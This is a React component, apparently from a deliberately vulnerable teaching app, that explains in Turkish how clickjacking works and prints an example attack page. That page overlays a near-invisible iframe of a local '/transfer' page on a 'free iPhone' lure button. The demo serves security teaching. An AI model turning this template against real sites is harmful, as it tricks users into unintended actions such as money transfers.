import React from 'react';

function ClickjackingDemo() {
  return (
    <div className="card">
      <h2>Clickjacking Demo <span className="vulnerability-tag">Clickjacking</span></h2>
      
      <p>Bu uygulama X-Frame-Options veya CSP frame-ancestors header'ı kullanmıyor.</p>
      <p>Bu, uygulamanın bir iframe içinde yüklenebileceği anlamına gelir.</p>

      <div style={{marginTop: '20px', padding: '15px', background: '#ffebee', borderRadius: '4px'}}>
        <h3>Clickjacking Saldırısı Nasıl Çalışır?</h3>
        <ol style={{lineHeight: '1.8'}}>
          <li>Saldırgan, kurbanı kendi sitesine çeker</li>
          <li>Saldırganın sitesi, hedef siteyi görünmez bir iframe içinde yükler</li>
          <li>Kurban, masum görünen bir butona tıklar</li>
          <li>Aslında, iframe içindeki bir butona tıklamış olur</li>
        </ol>

        <h3 style={{marginTop: '20px'}}>Örnek Saldırı Kodu:</h3>
        <pre style={{background: '#f5f5f5', padding: '10px', borderRadius: '4px', overflow: 'auto'}}>
{`<html>
<head>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      opacity: 0.0001;
      z-index: 2;
    }
    button {
      position: absolute;
      top: 100px;
      left: 100px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <iframe src="http://localhost:3000/transfer"></iframe>
  <button>Ücretsiz iPhone Kazan!</button>
</body>
</html>`}
        </pre>
      </div>

      <div style={{marginTop: '20px', padding: '15px', background: '#fff3cd', borderRadius: '4px'}}>
        <h3>Test Et</h3>
        <p>Bu sayfayı bir iframe içinde yükleyebilirsin:</p>
        <iframe 
          src="http://localhost:3000" 
          style={{width: '100%', height: '300px', border: '2px solid #ddd', borderRadius: '4px'}}
          title="Clickjacking Demo"
        />
      </div>
    </div>
  );
}

export default ClickjackingDemo;
